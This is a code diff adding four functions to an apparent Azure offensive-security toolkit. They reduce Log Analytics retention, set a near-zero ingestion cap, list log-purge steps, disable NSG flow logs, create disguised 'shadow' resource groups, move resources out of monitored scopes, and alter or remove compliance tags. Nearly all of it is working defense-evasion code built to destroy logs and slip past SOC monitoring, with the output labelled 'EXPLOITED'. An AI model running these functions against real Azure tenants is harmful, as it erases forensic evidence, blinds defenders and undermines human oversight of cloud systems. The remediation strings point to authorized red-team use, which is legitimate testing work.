@@ -716,3 +716,325 @@ export async function alertSuppress(args: string[], timeout: number): Promise<Ho
 
   return { output: output.join("\n"), findings }
 }
+
+export async function logAnalyticsTamper(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action") || "status"
+  const workspace = argVal(args, "--workspace")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Log Analytics workspace tampering...\n"]
+
+  const workspaces = await az(["monitor", "log-analytics", "workspace", "list", "--query", "[].{name:name,rg:resourceGroup,retention:retentionInDays,sku:sku.name,dailyCap:workspaceCapping.dailyQuotaGb}"], sub, timeout)
+  if (workspaces.exitCode !== 0) return { output: "[-] Cannot list Log Analytics workspaces", findings }
+  const wsList = tryJson(workspaces.stdout) || []
+  output.push(`[+] Log Analytics workspaces: ${wsList.length}`)
+  for (const ws of wsList) {
+    output.push(`    ${ws.name} (${ws.rg}) — retention: ${ws.retention}d, sku: ${ws.sku}, daily cap: ${ws.dailyCap || "unlimited"}GB`)
+    if (ws.retention > 30) {
+      findings.push({
+        checkId: "AZ-LAW-001",
+        provider: "azure",
+        severity: "info",
+        status: "INFO",
+        resource: `log-analytics://${ws.name}`,
+        title: `Log Analytics workspace: ${ws.name} (${ws.retention}d retention)`,
+        details: "Long retention — reducing it will cause log loss for SIEM/SOC",
+        remediation: "Restore retention after engagement",
+      })
+    }
+  }
+
+  const targetWs = workspace || wsList[0]?.name
+  const targetRg = rg || wsList[0]?.resourceGroup
+  if (!targetWs || !targetRg) return { output: output.join("\n"), findings }
+
+  if (action === "reduce_retention") {
+    const update = await az(
+      ["monitor", "log-analytics", "workspace", "update", "--workspace-name", targetWs, "--resource-group", targetRg, "--retention-time", "30"],
+      sub,
+      timeout,
+    )
+    if (update.exitCode === 0) {
+      output.push(`\n[+] Retention reduced to 30 days on ${targetWs}`)
+      output.push(`    Logs older than 30 days will be purged`)
+      findings.push({
+        checkId: "AZ-LAW-002",
+        provider: "azure",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `log-analytics://${targetWs}`,
+        title: `Log retention reduced to 30 days: ${targetWs}`,
+        details: "Historical investigation data will be lost as old logs are purged",
+        remediation: `Restore: az monitor log-analytics workspace update --workspace-name ${targetWs} --resource-group ${targetRg} --retention-time ORIGINAL`,
+      })
+    }
+    if (update.exitCode !== 0) output.push(`\n[-] Failed: ${update.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "set_daily_cap") {
+    const cap = argVal(args, "--cap-gb") || "0.1"
+    const update = await az(
+      ["monitor", "log-analytics", "workspace", "update", "--workspace-name", targetWs, "--resource-group", targetRg, "--quota", cap],
+      sub,
+      timeout,
+    )
+    if (update.exitCode === 0) {
+      output.push(`\n[+] Daily cap set to ${cap}GB on ${targetWs}`)
+      output.push(`    Once cap is hit, no new data ingested until next day — effectively blind`)
+      findings.push({
+        checkId: "AZ-LAW-003",
+        provider: "azure",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `log-analytics://${targetWs}`,
+        title: `Daily ingestion cap set to ${cap}GB: ${targetWs}`,
+        details: "Low cap will stop log ingestion quickly — attack activities won't be recorded",
+        remediation: `Remove cap: az monitor log-analytics workspace update --workspace-name ${targetWs} --resource-group ${targetRg} --quota -1`,
+      })
+    }
+    if (update.exitCode !== 0) output.push(`\n[-] Failed: ${update.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "purge") {
+    output.push(`\n[!] Log purge steps:`)
+    output.push(`    1. Identify table: SecurityEvent, AzureActivity, Syslog, etc.`)
+    output.push(`    2. Run purge: az monitor log-analytics workspace table data-export rule`)
+    output.push(`    3. Or use REST API: POST /workspaces/{wsId}/purge`)
+    output.push(`    Body: { table: "SecurityEvent", filters: [{ column: "TimeGenerated", operator: ">", value: "..." }] }`)
+    output.push(`    4. Purge is async — takes hours to complete`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function nsgFlowLogDisable(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action") || "status"
+  const nsgName = argVal(args, "--nsg-name")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] NSG flow log analysis...\n"]
+
+  const nsgs = await az(["network", "nsg", "list", "--query", "[].{name:name,rg:resourceGroup,location:location}"], sub, timeout)
+  if (nsgs.exitCode !== 0) return { output: "[-] Cannot list NSGs", findings }
+  const nsgList = tryJson(nsgs.stdout) || []
+  output.push(`[+] Network Security Groups: ${nsgList.length}`)
+
+  for (const nsg of nsgList) {
+    output.push(`    ${nsg.name} (${nsg.rg}) — ${nsg.location}`)
+    const flowLogs = await az(["network", "watcher", "flow-log", "list", "--nsg", nsg.name, "--resource-group", nsg.rg], sub, timeout)
+    if (flowLogs.exitCode === 0) {
+      const logs = tryJson(flowLogs.stdout) || []
+      if (logs.length === 0) {
+        output.push(`      [!] No flow logs configured`)
+        findings.push({
+          checkId: "AZ-NSGFLOW-001",
+          provider: "azure",
+          severity: "medium",
+          status: "FAIL",
+          resource: `nsg://${nsg.name}`,
+          title: `No NSG flow logs: ${nsg.name}`,
+          details: "Network traffic not being logged — lateral movement won't leave flow log trail",
+          remediation: "Enable NSG flow logs for network monitoring",
+        })
+      }
+      for (const l of logs) {
+        const enabled = l.enabled !== false
+        output.push(`      flow-log: ${l.name} [${enabled ? "ENABLED" : "DISABLED"}] → ${l.storageId?.split("/").pop() || "?"}`)
+        if (l.flowAnalyticsConfiguration?.networkWatcherFlowAnalyticsConfiguration?.enabled) {
+          output.push(`        Traffic Analytics: ENABLED`)
+        }
+      }
+    }
+  }
+
+  if (action === "disable" && nsgName && rg) {
+    const flowLogs = await az(["network", "watcher", "flow-log", "list", "--nsg", nsgName, "--resource-group", rg], sub, timeout)
+    if (flowLogs.exitCode !== 0) return { output: output.join("\n") + "\n[-] Cannot list flow logs for target NSG", findings }
+    const logs = tryJson(flowLogs.stdout) || []
+    let disabled = 0
+    for (const l of logs) {
+      if (l.enabled === false) continue
+      const dis = await az(["network", "watcher", "flow-log", "update", "--name", l.name, "--nsg", nsgName, "--resource-group", rg, "--enabled", "false"], sub, timeout)
+      if (dis.exitCode === 0) {
+        output.push(`\n[+] Disabled flow log: ${l.name}`)
+        disabled++
+      }
+    }
+    if (disabled > 0) {
+      findings.push({
+        checkId: "AZ-NSGFLOW-002",
+        provider: "azure",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `nsg://${nsgName}`,
+        title: `${disabled} NSG flow log(s) disabled on ${nsgName}`,
+        details: "Network traffic through this NSG will not be logged",
+        remediation: `Re-enable: az network watcher flow-log update --nsg ${nsgName} --resource-group ${rg} --enabled true`,
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function resourceMove(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action") || "list"
+  const sourceRg = argVal(args, "--source-rg")
+  const targetRg = argVal(args, "--target-rg")
+  const resourceId = argVal(args, "--resource-id")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure resource move for monitoring evasion...\n"]
+
+  if (action === "list") {
+    const rgs = await az(["group", "list", "--query", "[].{name:name,location:location,tags:tags}"], sub, timeout)
+    if (rgs.exitCode !== 0) return { output: "[-] Cannot list resource groups", findings }
+    const rgList = tryJson(rgs.stdout) || []
+    output.push(`[+] Resource groups: ${rgList.length}`)
+    for (const g of rgList) output.push(`    ${g.name} — ${g.location}`)
+
+    output.push(`\n[*] Resource move evasion techniques:`)
+    output.push(`    1. Move resource out of monitored RG to unmonitored one`)
+    output.push(`    2. Move to a different subscription (if cross-sub access exists)`)
+    output.push(`    3. Resources retain their IDs but change RG scope — alerts scoped to source RG stop firing`)
+    output.push(`    4. Azure Policy assignments scoped to source RG no longer apply`)
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "create_rg") {
+    const name = targetRg || `cs-shadow-${Date.now().toString(36)}`
+    const location = argVal(args, "--location") || "eastus"
+    const create = await az(["group", "create", "--name", name, "--location", location, "--tags", "team=infra"], sub, timeout)
+    if (create.exitCode === 0) {
+      output.push(`[+] Shadow resource group created: ${name}`)
+      output.push(`    Location: ${location}`)
+      output.push(`    Use as target for resource moves to evade RG-scoped monitoring`)
+      findings.push({
+        checkId: "AZ-MOVE-001",
+        provider: "azure",
+        severity: "medium",
+        status: "DEPLOYED",
+        resource: `rg://${name}`,
+        title: `Shadow resource group created: ${name}`,
+        details: "Unmonitored RG — move resources here to evade scoped alerts/policies",
+        remediation: `Delete: az group delete --name ${name}`,
+      })
+    }
+    if (create.exitCode !== 0) output.push(`[-] Failed: ${create.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "move" && sourceRg && targetRg && resourceId) {
+    output.push(`[*] Moving resource to ${targetRg}...`)
+    const move = await az(["resource", "move", "--destination-group", targetRg, "--ids", resourceId], sub, timeout)
+    if (move.exitCode === 0) {
+      output.push(`[+] Resource moved to ${targetRg}`)
+      findings.push({
+        checkId: "AZ-MOVE-002",
+        provider: "azure",
+        severity: "high",
+        status: "EXPLOITED",
+        resource: resourceId,
+        title: `Resource moved from ${sourceRg} to ${targetRg}`,
+        details: "Resource no longer covered by source RG monitoring/policy scope",
+        remediation: `Move back: az resource move --destination-group ${sourceRg} --ids ${resourceId}`,
+      })
+    }
+    if (move.exitCode !== 0) output.push(`[-] Move failed: ${move.stderr.slice(0, 300)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function tagManipulation(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action") || "status"
+  const resourceId = argVal(args, "--resource-id")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure tag manipulation for evasion...\n"]
+
+  if (action === "status") {
+    const rgArgs = rg ? ["--resource-group", rg] : []
+    const resources = await az(["resource", "list", ...rgArgs, "--query", "[].{name:name,type:type,rg:resourceGroup,tags:tags}"], sub, timeout)
+    if (resources.exitCode !== 0) return { output: "[-] Cannot list resources", findings }
+    const list = tryJson(resources.stdout) || []
+    output.push(`[+] Resources: ${list.length}`)
+
+    const tagPatterns = ["environment", "env", "team", "owner", "cost-center", "project", "compliance", "security"]
+    const policyRelevant: string[] = []
+
+    for (const r of list.slice(0, 30)) {
+      const tags = r.tags || {}
+      const tagKeys = Object.keys(tags)
+      const secTags = tagKeys.filter((k: string) => tagPatterns.some(p => k.toLowerCase().includes(p)))
+      if (secTags.length > 0) {
+        output.push(`    ${r.name} (${r.type?.split("/").pop()})`)
+        for (const t of secTags) output.push(`      ${t}: ${tags[t]}`)
+        policyRelevant.push(r.name)
+      }
+    }
+
+    if (policyRelevant.length > 0) {
+      output.push(`\n[!] ${policyRelevant.length} resources have policy/compliance-relevant tags`)
+      output.push(`    Modifying these tags can:`)
+      output.push(`    - Bypass tag-based Azure Policy assignments`)
+      output.push(`    - Remove resources from compliance scopes`)
+      output.push(`    - Hide resources from cost/billing dashboards`)
+      output.push(`    - Evade tag-based alert rules`)
+      findings.push({
+        checkId: "AZ-TAG-001",
+        provider: "azure",
+        severity: "medium",
+        status: "INFO",
+        resource: "subscription://tags",
+        title: `${policyRelevant.length} resources with policy-relevant tags`,
+        details: "Tag modification can bypass policy enforcement and monitoring scopes",
+        remediation: "Use tag locks and audit tag changes via Activity Log",
+      })
+    }
+  }
+
+  if (action === "modify" && resourceId) {
+    const tagName = argVal(args, "--tag-name") || "environment"
+    const tagValue = argVal(args, "--tag-value") || "dev"
+    const update = await az(["tag", "update", "--resource-id", resourceId, "--operation", "merge", "--tags", `${tagName}=${tagValue}`], sub, timeout)
+    if (update.exitCode === 0) {
+      output.push(`[+] Tag set: ${tagName}=${tagValue} on resource`)
+      findings.push({
+        checkId: "AZ-TAG-002",
+        provider: "azure",
+        severity: "high",
+        status: "EXPLOITED",
+        resource: resourceId,
+        title: `Tag modified: ${tagName}=${tagValue}`,
+        details: "Resource may now bypass tag-scoped policies or monitoring rules",
+        remediation: `Restore original tag value on ${resourceId}`,
+      })
+    }
+    if (update.exitCode !== 0) output.push(`[-] Failed: ${update.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "remove" && resourceId) {
+    const tagName = argVal(args, "--tag-name")
+    if (!tagName) return { output: output.join("\n") + "\n[-] --tag-name required for remove", findings }
+    const update = await az(["tag", "update", "--resource-id", resourceId, "--operation", "delete", "--tags", tagName], sub, timeout)
+    if (update.exitCode === 0) {
+      output.push(`[+] Tag removed: ${tagName}`)
+      findings.push({
+        checkId: "AZ-TAG-003",
+        provider: "azure",
+        severity: "high",
+        status: "EXPLOITED",
+        resource: resourceId,
+        title: `Tag removed: ${tagName}`,
+        details: "Resource no longer matches tag-scoped policies or monitoring rules",
+        remediation: `Restore tag ${tagName} on ${resourceId}`,
+      })
+    }
+    if (update.exitCode !== 0) output.push(`[-] Failed: ${update.stderr.slice(0, 200)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
